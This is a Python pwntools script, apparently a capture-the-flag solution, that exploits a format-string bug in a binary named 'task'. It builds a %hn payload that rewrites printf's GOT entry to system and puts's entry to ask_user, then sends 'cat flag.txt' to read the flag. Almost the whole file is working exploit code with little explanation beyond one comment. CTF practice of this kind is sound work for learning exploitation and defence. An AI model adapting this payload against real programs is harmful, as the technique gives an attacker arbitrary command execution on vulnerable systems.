from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+182",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)


# the idea is to overwrite printf got with system plt so we can control the command and also overwrite puts got with ask_user so we can loop the program and use previous hack

# print(f'printf GOT: {hex(elf.got["printf"])}')
# print(f'system PLT: {hex(elf.plt["system"])}')
# print(f'puts   GOT: {hex(elf.got["puts"])}')
# print(f'ask_user  : {hex(elf.symbols["ask_user"])}')

# printf GOT: 0x404030
# system PLT: 0x4010c4
# puts   GOT: 0x404018
# ask_user  : 0x4011f6


def find_bigger_closest(current, target, mask):
	if current < target:
		return target - current

	incrementer = 1 << (mask << 3)

	while current > target:
		target += incrementer
	
	return target - current


payload = b''
emitted = 0

system_plt = elf.plt['system']
padding = find_bigger_closest(emitted, (system_plt & 0xFFFF), 2)
system_plt_up = (system_plt >> 16) & 0xFFFF
emitted += padding
payload += f'%{padding}c%14$hn'.encode()

padding = find_bigger_closest(emitted, system_plt_up, 2)
emitted += padding
payload += f'%{padding}c%15$hn'.encode()

padding = find_bigger_closest(emitted, 0, 2)
emitted += padding
payload += f'%{padding}c%16$hn%17$hn'.encode()

ask_user = elf.symbols['ask_user'] & 0xFFFF
padding = find_bigger_closest(emitted, ask_user, 2)
payload += f'%{padding}c%18$hn'.encode()

padding = 8 - (len(payload) % 8)
payload += b'A' * padding

payload += p64(elf.got["printf"]) + p64(elf.got["printf"] + 2) + p64(elf.got["printf"] + 4) + p64(elf.got["printf"] + 6) + p64(elf.got["puts"])

p.sendline(payload)

sleep(1)

p.sendline(b"cat flag.txt")
print(p.clean(1.0).replace(b' ', b''))
